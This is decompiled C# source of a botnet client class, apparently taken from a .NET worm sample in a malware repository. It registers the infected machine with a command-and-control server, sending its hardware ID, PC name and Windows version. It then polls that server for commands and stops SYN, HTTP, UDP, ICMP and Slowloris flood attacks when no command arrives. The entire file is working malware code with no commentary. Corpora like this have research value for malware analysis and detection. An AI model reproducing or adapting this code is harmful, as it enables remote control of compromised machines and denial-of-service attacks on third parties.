// Decompiled with JetBrains decompiler
// Type: SysDriver.cControl
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace SysDriver
{
  internal class cControl : cCommandHandler
  {
    private string sOldCommand = string.Empty;

    public void ConnectControl()
    {
      this.registerCCServer();
      new Thread(new ThreadStart(this.getCCServerCommand)).Start();
    }

    private void registerCCServer()
    {
      string Parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&pcname=" + cMain.ConfigClass.sPCName + "&version=" + cMain.ConfigClass.sBotVersion + "&system=" + cMain.ConfigClass.sWinVersion;
      while (true)
      {
        try
        {
          string str = this.HTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (str.Length > 0)
          {
            if (str == cMain.ConfigClass.sAuthCode)
              break;
            Environment.Exit(0);
          }
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 1000);
      }
    }

    private void getCCServerCommand()
    {
      string Parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
      while (true)
      {
        try
        {
          string sCommand = this.HTTPRequest(cMain.ConfigClass.sCServerAddress, Parameters);
          if (sCommand.Length > 0)
          {
            if (sCommand != this.sOldCommand)
            {
              this.handleCommand(sCommand);
              this.sOldCommand = sCommand;
            }
          }
          else
          {
            try
            {
              nSYNFlood.StopSYNFlood();
            }
            catch
            {
            }
            try
            {
              nHTTPFlood.StopHTTPFlood();
            }
            catch
            {
            }
            try
            {
              nUDPFlood.StopUDPFlood();
            }
            catch
            {
            }
            try
            {
              nICMPFlood.StopICMPFlood();
            }
            catch
            {
            }
            try
            {
              nSlowlorisFlood.Stop();
            }
            catch
            {
            }
            this.sOldCommand = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 1000);
      }
    }

    private string HTTPRequest(string URI, string Parameters)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(URI);
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      httpWebRequest.Method = "POST";
      httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
      byte[] bytes = Encoding.Default.GetBytes(Parameters);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
    }
  }
}
